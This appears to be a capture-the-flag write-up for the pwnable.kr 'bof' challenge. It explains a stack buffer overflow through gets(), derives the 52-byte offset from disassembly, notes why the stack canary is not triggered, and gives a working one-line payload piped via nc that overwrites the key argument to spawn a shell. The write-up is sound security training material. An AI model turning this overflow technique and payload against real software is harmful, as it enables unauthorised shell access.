# Writeup: bof (pwnable.kr)

## Challenge Info
- **Target:** `bof`
- **Vulnerability:** Stack-based Buffer Overflow
- **Source Snippet:**
  ```c
  void func(int key){
      char overflowme[32];
      gets(overflowme); // Vulnerable
      if(key == 0xcafebabe){
		   setregid(getegid(), getegid());
          system("/bin/sh");
      }
  }
  ```

## Analysis
The challenge binary uses the vulnerable `gets()` function to read input into a 32-byte buffer (`overflowme`). Since `gets()` does not perform bounds checking, we can overflow this buffer to reach and overwrite the `key` parameter stored further down the stack.

### Disassembly (IDA)
In `func`, we identify the stack offsets for the buffer and the argument:
- **Buffer (`overflowme`)**: Loaded into `eax` via `lea eax, [ebp-2c]`.
- **Key**: Compared at `ebp+8h`.

```asm
.text:00001230    lea     eax, [ebp-2Ch]  ; buffer loaded from ebp-2c
.text:00001233    push    eax
.text:00001234    call    _gets
...
.text:0000123C    cmp     [ebp+8h], 0CAFEBABEh ; arg_0 is at ebp+8h
```

### Exploitation
The distance from the start of the buffer to the `key` argument is:
`0x08 - (-0x2C) = 0x34 = 52 bytes`

Therefore, we need 52 bytes of padding (32 bytes taken by the buffer, 20 bytes from the compiler padding) followed by the target value `0xcafebabe`.

The binary has a stack canary, but since we are overwriting an argument located above the return address and the canary we don't trigger it.

### Payload
Python to generate the payload. little-endian, `0xcafebabe` becomes `\xbe\xba\xfe\xca`.

```bash
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca')"; cat) | nc pwnable.kr 9000
```

*Note: The binary has a stack canary (`gs:14h`), but since we are overwriting an argument located **above** the saved return address and canary on the stack, we don't trigger the stack smashing protector before the check occurs.*
